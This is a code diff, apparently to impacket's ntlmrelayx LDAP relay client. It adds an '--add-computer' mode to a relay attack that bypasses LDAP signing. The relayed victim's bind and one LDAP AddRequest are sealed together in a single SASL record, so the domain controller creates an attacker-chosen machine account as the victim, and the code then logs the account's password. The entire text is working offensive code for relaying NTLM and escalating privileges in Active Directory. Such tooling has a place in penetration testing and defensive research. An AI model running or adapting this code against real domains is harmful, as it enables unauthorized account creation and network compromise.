@@ -38,7 +38,7 @@ from impacket.examples.ntlmrelayx.clients import ProtocolClient
 from impacket.examples.ntlmrelayx.utils import shadow_credentials
 from impacket.ldap import ldaptypes
 from impacket.ldap.ldap import LDAPConnection, LDAPSessionError, get_entry_values
-from impacket.ldap.ldapasn1 import BindRequest, LDAPMessage, ModifyRequest, Operation, ResultCode, Scope
+from impacket.ldap.ldapasn1 import AddRequest, BindRequest, LDAPMessage, ModifyRequest, Operation, ResultCode, Scope
 from impacket.nmb import NetBIOSError
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
 from impacket.ntlm import (
@@ -228,7 +228,7 @@ class LDAPRelayClient(ProtocolClient):
             attributes=['namingContexts'])
 
     # LDAP signing bypass: the relayed bind and one write share a SASL record sealed with our key, so the DC runs the write as the victim; single-shot since the seal key becomes the victim's afterwards
-    SUPPORTED_BYPASS_ATTACKS = ('--delegate-access', '--shadow-credentials')
+    SUPPORTED_BYPASS_ATTACKS = ('--delegate-access', '--shadow-credentials', '--add-computer')
 
     def bypassSelectedAttack(self):
         # Reuse the existing LDAP attack options; exactly one write attack must be selected
@@ -237,13 +237,79 @@ class LDAPRelayClient(ProtocolClient):
             selected.append('rbcd')
         if self.serverConfig.IsShadowCredentialsAttack:
             selected.append('shadow')
+        if self.serverConfig.addcomputer is not None:
+            selected.append('addcomputer')
         return selected[0] if len(selected) == 1 else None
 
     def bypassBuildWrite(self):
-        # (attribute, [values], operation) of the ModifyRequest executed as the relayed victim
+        # (attribute, [values], operation) -- or ('ADD_COMPUTER', None, None) for an AddRequest
         if self.bypassSelectedAttack() == 'rbcd':
             return self.bypassRbcdWrite()
+        if self.bypassSelectedAttack() == 'addcomputer':
+            return self.bypassAddComputerBuild()
         return self.bypassShadowWrite()
+
+
+    def bypassAddComputerBuild(self):
+        """Prepare an LDAP ADD that creates a machine account through the single-shot bypass."""
+        computerName = ''
+        computerPassword = ''
+        if self.serverConfig.addcomputer:
+            if len(self.serverConfig.addcomputer) > 0:
+                computerName = self.serverConfig.addcomputer[0]
+            if len(self.serverConfig.addcomputer) > 1:
+                computerPassword = self.serverConfig.addcomputer[1]
+        if not computerName:
+            computerName = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
+        else:
+            computerName = computerName if computerName.endswith('$') else computerName + '$'
+        if not computerPassword:
+            computerPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
+
+        hostname = computerName[:-1]
+        domain = '.'.join(part.split('=', 1)[1] for part in self.baseDN.split(',') if part.lower().startswith('dc='))
+
+        self._addComputerDN = 'CN=%s,CN=Computers,%s' % (hostname, self.baseDN)
+        self._addComputerSam = computerName
+        self._addComputerPassword = computerPassword
+        self._addComputerHostname = hostname
+        self._addComputerDomain = domain
+        self._addComputerSPNs = [
+            'HOST/%s' % hostname,
+            'HOST/%s.%s' % (hostname, domain),
+            'RestrictedKrbHost/%s' % hostname,
+            'RestrictedKrbHost/%s.%s' % (hostname, domain),
+        ]
+        return 'ADD_COMPUTER', None, None
+
+    def bypassBuildAddRequest(self):
+        """Construct the LDAP AddRequest that creates the machine account in a single operation."""
+        from pyasn1.type.univ import OctetString
+        add = AddRequest()
+        add['entry'] = self._addComputerDN
+        attrs = add['attributes']
+        idx = 0
+
+        def _set(name, *vals):
+            nonlocal idx
+            attr = attrs.componentType.clone()
+            attr['type'] = name
+            attr['vals'].setComponents(*(OctetString(v if isinstance(v, bytes) else v.encode()) for v in vals))
+            attrs.setComponentByPosition(idx, attr)
+            idx += 1
+
+        _set('objectClass', 'top', 'person', 'organizationalPerson', 'user', 'computer')
+        _set('sAMAccountName', self._addComputerSam)
+        _set('userAccountControl', '4096')
+        _set('dnsHostName', '%s.%s' % (self._addComputerHostname, self._addComputerDomain))
+        _set('servicePrincipalName', *self._addComputerSPNs)
+        # unicodePwd: the quoted password in UTF-16LE, accepted over SASL-sealed LDAP
+        pwd = ('"%s"' % self._addComputerPassword).encode('utf-16-le')
+        pwd_attr = attrs.componentType.clone()
+        pwd_attr['type'] = 'unicodePwd'
+        pwd_attr['vals'].setComponents(OctetString(pwd))
+        attrs.setComponentByPosition(idx, pwd_attr)
+        return add
 
     def bypassRbcdWrite(self):
         # Grant RBCD on the victim's own object to the account we control, appending to any existing ACEs
@@ -297,8 +363,13 @@ class LDAPRelayClient(ProtocolClient):
         return 'msDS-KeyCredentialLink', new_values, Operation('replace')
 
     def bypassAnnounceSuccess(self):
-        # Post-write messages mirroring the classic attacks, printed only once the Modify is accepted
-        if self.serverConfig.delegateaccess:
+        # Post-write messages mirroring the classic attacks, printed only once the write is accepted
+        if getattr(self, '_isAddOperation', False):
+            LOG.info('Computer account created successfully!')
+            LOG.info('  Account:  %s', self._addComputerSam)
+            LOG.info('  Password: %s', self._addComputerPassword)
+            LOG.info('  DN:       %s', self._addComputerDN)
+        elif self.serverConfig.delegateaccess:
             LOG.info('Delegation rights modified succesfully!')
             LOG.info('%s can now impersonate users on %s via S4U2Proxy', self.serverConfig.escalateuser, self.targetSam)
         elif self.shadowKeyCert is not None:
@@ -486,7 +557,10 @@ class LDAPRelayClient(ProtocolClient):
             target = self.serverConfig.delegatetarget
 
         try:
-            if '=' in target:
+            if self.bypassSelectedAttack() == 'addcomputer':
+                self.targetDN = 'CN=Computers,%s' % self.baseDN
+                self.targetSam = victim
+            elif '=' in target:
                 self.targetDN = target
                 self.targetSam = target.split(',')[0].split('=', 1)[-1]
             else:
@@ -510,13 +584,20 @@ class LDAPRelayClient(ProtocolClient):
             final['mechListMIC'] = authenticateMessageBlob[-16:]
 
         bind_message = self.ldapMessage(self.saslBindRequest(final.getData()), 1)
-        modify_message = self.ldapMessage(self.modifyRequest(attribute, values, operation), 2)
+        if attribute == 'ADD_COMPUTER':
+            write_message = self.ldapMessage(self.bypassBuildAddRequest(), 2)
+            write_label = 'ADD %s' % self._addComputerDN
+            self._isAddOperation = True
+        else:
+            write_message = self.ldapMessage(self.modifyRequest(attribute, values, operation), 2)
+            write_label = '%s on %s' % (attribute, self.targetDN)
+            self._isAddOperation = False
 
         # Both messages, sealed as one SASL record under our own key: the crux of the bypass
-        record = self.bypassConnection.encrypt(bind_message + modify_message)
+        record = self.bypassConnection.encrypt(bind_message + write_message)
         self.bypassConnection._socket.sendall(record)
-        LOG.info('LDAP signing bypass: same-record frame sent, victim %s writing %s on %s' % (
-            victim, attribute, self.targetDN))
+        LOG.info('LDAP signing bypass: same-record frame sent, victim %s writing %s' % (
+            victim, write_label))
 
         modify_accepted = self.readInRecordResponses()
         if self.verifyWrite(attribute, self.confirmValue) or modify_accepted:
@@ -527,7 +608,8 @@ class LDAPRelayClient(ProtocolClient):
     def readInRecordResponses(self):
         # Whether the injected Modify was accepted, when the DC answers it under the key we still hold
         modify_ok = False
-        for label in ('Bind', 'Modify'):
+        op_label = 'Add' if getattr(self, '_isAddOperation', False) else 'Modify'
+        for label in ('Bind', op_label):
             try:
                 length = unpack('>I', self.recvExact(4))[0]
                 plaintext = self.bypassConnection.decrypt(pack('>I', length) + self.recvExact(length))
@@ -539,7 +621,7 @@ class LDAPRelayClient(ProtocolClient):
                 break
             LOG.info('LDAP signing bypass: %s -> %s %s' % (label, result['resultCode'].prettyPrint(),
                      bytes(result['diagnosticMessage']).decode(errors='replace')[:80]))
-            if label == 'Modify' and result['resultCode'] == ResultCode('success'):
+            if label in ('Modify', 'Add') and result['resultCode'] == ResultCode('success'):
                 modify_ok = True
         return modify_ok
 
